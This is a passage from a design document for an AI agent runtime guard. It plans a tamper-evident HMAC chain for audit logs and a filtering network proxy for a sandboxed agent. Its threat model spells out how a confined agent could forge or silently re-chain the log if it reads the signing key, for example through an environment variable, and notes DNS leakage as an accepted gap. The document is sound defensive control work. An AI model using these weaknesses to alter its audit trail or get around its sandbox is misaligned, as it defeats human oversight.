**Degraded mode rationale:** Preventing event logging entirely to preserve chain integrity would
make AIRG non-functional in a key-loss scenario. The audit trail (even unsigned) is better than
no audit trail. The `_chain_error` field makes the gap visible to the verifier.

The verifier (`verify_chain`) should flag entries with `_chain_error` as warnings (integrity is
degraded for that segment) rather than hard errors.

---

### B.4 Threat Model — Honesty

**What the chain provides:** TAMPER-EVIDENCE (detectability after the fact), not TAMPER-PREVENTION.

| Claim | True? |
|-------|-------|
| Any log entry modification is detectable | Yes, IF the key is unavailable to the attacker |
| Any entry deletion is detectable | Yes, via sequence gap (middle) or checkpoint comparison (end) |
| Any reordering is detectable | Yes |
| Front-truncation is detectable | Yes, via genesis-sentinel check |
| The agent cannot forge a new valid log | Yes, IF the key is outside the sandbox / unreadable to agent |
| The agent cannot silently tamper with log | Yes, IF the key is outside the sandbox / unreadable to agent |
| An adversary WITH the key can re-chain a forged log | Yes — this is the key trust assumption |
| The chain prevents tampering in real time | No — this is a detection mechanism, not prevention |
| Append-only is enforced at the OS level | No — Landlock cannot do this (the explicit gap this addresses) |

**The key trust assumption is the load-bearing security claim:**
If an attacker obtains the HMAC key, they can compute valid HMACs over forged entries and produce
an indistinguishable forged log. The chain provides NO protection against an attacker who has the key.

**Therefore:**
- The key MUST be stored outside the sandbox — in Topology A, `approvals.db.hmac.key` is already
  in the AIRG state directory, which is kernel-unreachable from the confined agent. This is the
  required deployment posture.
- In Topology B (AIRG inside), the key must be externalized to a path the agent cannot reach.
  `approvals.py` already warns (`approval_hmac_key_inside_workspace`) if the key path is inside the
  workspace. This warning must be escalated to an error for `audit.chain_enabled: true` in Topology B.
- The key should not be passed via env var in production (`AIRG_APPROVAL_HMAC_SECRET`) — an
  env-var is readable from `/proc/<pid>/environ` by any process with the same uid. The key file
  with 0600 permissions is the correct storage.
- Periodic key rotation (e.g., on log rotation) limits the window of exposure if a key is
  compromised. Each log segment would use a different key version, identified by a key ID in the
  chain genesis entry.

**Defense-in-depth framing:**
The chain is a SECOND layer alongside Topology A's kernel-enforced separation. In Topology A, the
agent cannot reach the log or the key at all — tampering is physically prevented. The chain adds
an independent cryptographic layer so that even a compromise of the AIRG server process (but not
the key) is detectable.

---

### B.5 Interaction with `reports.py` Ingest

The `reports.py::sync_from_log` pipeline (`_normalize_event`, `_event_key`) must not break when
chain fields are added to log entries.

**Impact analysis:**

1. **`_event_key(raw_line)`:** Computes `hashlib.sha256(raw_line.encode()).hexdigest()` of the raw
   JSON line. Since `_chain_hmac` and `_chain_seq` will be part of the raw line, two entries with
   identical content but different chain positions would produce different `event_key` values.
   This is correct behavior — the `event_key` uniqueness constraint in `reports.db` is based on
   the raw line hash, and chain-field changes make lines unique. No action needed; `_event_key`
   works correctly.

2. **`_normalize_event(raw, raw_line)`:** Extracts known fields by name and places extras in
   `raw_json`. `_chain_seq` and `_chain_hmac` are not in the list of extracted columns in
   `init_reports_store`. They will pass through into `raw_json` (the full raw line stored as TEXT).
   No existing columns break. No action needed for baseline functionality.

3. **Optional: add chain columns to `reports.db`:** For verifier queries (e.g., "show me all
   entries with chain breaks"), add `chain_seq INTEGER` and `chain_hmac TEXT` columns to the
   `events` table. This requires a schema migration (`ALTER TABLE events ADD COLUMN chain_seq
   INTEGER DEFAULT NULL`). The `init_reports_store` function already handles backward-compatible
   migration (see the `agent_session_id` migration at line ~112). The same pattern applies here.
   This is a P2 optional enhancement.

4. **Log rotation detection in `sync_from_log`:** The existing rotation detection
   (`size_now < offset or (mtime_now != prev_mtime and size_now <= offset)`) restarts from offset 0
   when rotation is detected. A new chain segment starts with `_chain_seq = 0`. The ingest pipeline
   does not need to validate chain integrity; that is the `verify_chain` function's responsibility.

**Summary:** The chain fields are additive. Existing `reports.py` code requires NO changes for
baseline correctness. Optional column additions for chain-aware queries are a P2 enhancement.

---

### B.6 Phased Plan + Codebase Touch-Points

| Phase | Deliverable | Touch-points |
|-------|-------------|--------------|
| **P2.B.1** | In-memory chain state + `append_log_entry` signing | `src/audit.py` (add `_AuditChainState`, `_compute_entry_hmac`, update `append_log_entry`); `src/approvals.py` (export `_approval_signing_key` as `get_audit_signing_key` or simply import in `audit.py`); `src/config.py` (add `audit.chain_enabled: bool`, `audit.chain_checkpoint_interval: int`). |
| **P2.B.2** | Verify command + `airg-doctor` integration | `src/airg_cli.py` (`_doctor_audit_chain_check`, `--verify-audit-log` flag or `main_verify_audit`); `pyproject.toml` (optional new script entry). |
| **P2.B.3** | `reports.db` checkpoint table | `src/reports.py` (add `audit_chain_checkpoints` table in `init_reports_store`; add `_write_chain_checkpoint` call in `sync_from_log` or via a separate trigger); `src/audit.py` (trigger checkpoint write every N entries). |
| **P2.B.4** | Optional `reports.db` chain columns | `src/reports.py` (migration: add `chain_seq`, `chain_hmac` columns; update `_normalize_event` to extract them). |
| **P2.B.5** | Key rotation on log rotation | `src/audit.py` (on rotation, generate new chain segment; record key version ID in genesis entry). `src/approvals.py` or a new `src/audit_key.py`. |

**Detailed touch-points for P2.B.1:**

`src/audit.py`:
- Add module-level `_AuditChainState` dataclass/namedtuple: `prev_hmac: str`, `next_seq: int`, `initialized: bool`.
- Add `_load_chain_state()`: reads the last line of `LOG_PATH`; if it has `_chain_hmac` and `_chain_seq`, set `prev_hmac = entry["_chain_hmac"]`, `next_seq = entry["_chain_seq"] + 1`; otherwise (empty file, legacy entries, or degraded entry), use genesis sentinel and seq 0.
- Add `_compute_entry_hmac(entry, prev_hmac, key)`: implements the computation from §B.2.4.
- Update `append_log_entry(entry)`: if `audit.chain_enabled` is True in POLICY, load/use chain state, compute HMAC, add `_chain_seq` and `_chain_hmac` to the entry before `json.dumps`. If key unavailable, add `_chain_error` field, continue.
- The canonical JSON for signing is computed BEFORE `json.dumps` for the file write; the file write uses the same canonical form (or adds a `_chain_hmac` field to the entry dict that was used for signing, which means the file line IS `json.dumps(entry, sort_keys=True, ...)`). Consistency: if signing uses `sort_keys=True`, the file line should also use `sort_keys=True` so that `_event_key(raw_line)` in `reports.py` is stable.

`src/config.py`:
- In the `audit = _ensure_dict("audit")` block, add:
  ```python
  audit.setdefault("chain_enabled", False)
  if not isinstance(audit["chain_enabled"], bool):
      raise ValueError("audit.chain_enabled must be boolean")
  audit.setdefault("chain_checkpoint_interval", 100)
  if int(audit["chain_checkpoint_interval"]) < 1:
      raise ValueError("audit.chain_checkpoint_interval must be >= 1")
  ```

`policy.json`:
- Add `"chain_enabled": false, "chain_checkpoint_interval": 100` to the `audit` section.

`tests/test_helpers.py`:
- Add `"chain_enabled": false` to `DEFAULT_TEST_POLICY["audit"]`.

`tests/test_audit_chain.py` (new):
- Genesis chain start, sequential entries, HMAC verification, tamper detection (modify/delete/reorder), degraded mode (key unavailable), legacy entry passthrough, rotation restart.

---

## Summary Table — Two P2 Items at a Glance

| Dimension | Part A — Network Proxy | Part B — Audit Chain |
|-----------|----------------------|---------------------|
| Gap being closed | Landlock is port-only; `network_policy_check` is heuristic text-based | Landlock cannot enforce append-only; plain log is tamper-vulnerable |
| Mechanism | Filtering CONNECT proxy; sandbox forces all TCP through it | HMAC chain over entries, keyed by approval HMAC key |
| Key design invariant | Proxy is driven by existing `policy.network` fields; no new domain policy | Chain uses existing `approvals.db.hmac.key`; no new key material |
| What it provides | Domain-level egress enforcement for proxy-aware clients | Tamper-detectability for any topology |
| What it does NOT provide | Filtering of proxy-unaware tools (kernel blocks those); TLS payload inspection | Tamper-prevention; protection if attacker holds the key |
| New policy fields | `os_sandbox.network_proxy` sub-object | `audit.chain_enabled`, `audit.chain_checkpoint_interval` |
| New source files | `src/network_proxy.py` | Extended `src/audit.py`; new `tests/test_audit_chain.py` |
| Existing files modified | `src/config.py`, `src/sandbox_launcher.py`, `src/airg_cli.py`, `policy.json` | `src/config.py`, `src/audit.py`, `src/airg_cli.py`, `policy.json`, `src/reports.py` (optional) |
| Threat model caveat | Proxy-unaware tools are blocked at kernel layer (fail-closed); DNS leakage accepted | Chain protects only if key is outside sandbox / unreadable to agent |
| Gate-independent? | Yes — does not require P1 features to design or implement | Yes — does not require P1 features to design or implement |

---

## Open Questions

1. **`os_sandbox.network_mode = "proxy"` as a first-class enum value:** Should the schema
   (`sandbox-policy-schema.md §2.1.5`) be updated to add `"proxy"` as a fourth value for
   `network_mode`, explicitly codifying the proxy topology? Or should the proxy be activated
   separately via `network_proxy.enabled: true` alongside `network_mode: "loopback_only"`? The
   explicit `"proxy"` value is cleaner for the operator but requires a schema amendment. Recommend
   adding `"proxy"` as the intent-expressing value and having the launcher automatically set
   `allowed_tcp_ports = [proxy_port]` when `network_mode == "proxy"`.

2. **DNS filtering scope:** UDP port 53 is not filterable by Landlock. DNS queries for blocked
   domains leak intent (but not data). Is this acceptable for the P2 threat model, or should the
   design include a filtering DNS resolver (e.g., injecting a custom `/etc/resolv.conf` pointing to
   a localhost filtering resolver)? Recommended position: accept DNS leakage at P2 (defense-in-depth
   framing); add filtering DNS as a P3/P4 option.

3. **Audit chain `sort_keys=True` format change:** Switching `append_log_entry` from
   `json.dumps(entry)` (insertion-order) to `json.dumps(entry, sort_keys=True, ...)` (canonical)
   changes the byte content of every line. The `_event_key` in `reports.py` is a SHA256 of the raw
   line — this means all pre-existing entries in `reports.db` would have different `event_key`
   values from entries written after the schema change. The `INSERT OR IGNORE` deduplication would
   not detect the semantic overlap. Mitigation: version the log format (add `"_log_format": "v2"`
   to chain-enabled entries); the ingest pipeline can normalize but not deduplicate across versions.
   Alternatively, accept the format break as a clean migration point.

4. **Checkpoint timing vs. performance:** Writing a checkpoint every 100 entries to `reports.db`
   means 100 extra SQLite writes per 100 log entries. Under heavy load (1000+ entries/second), this
   adds ~10 writes/second to `reports.db`. The existing `reports.db` ingest already does batched
   writes; the checkpoint write can be batched with the next scheduled ingest cycle rather than
   written inline in `append_log_entry`. Clarify whether checkpoints are written inline (strong
   guarantee, higher overhead) or via the ingest cycle (weaker guarantee, lower overhead).

5. **Key rotation on log rotation:** How are old log segments verified after key rotation? The
   genesis entry of each segment should include a `_chain_key_id` field (a truncated hash or
   version identifier of the key, not the key itself) so the verifier knows which key version to
   load. Key version management is a non-trivial new surface. Recommend deferring key rotation to
   a follow-up and documenting it as a known limitation of the P2 scheme.
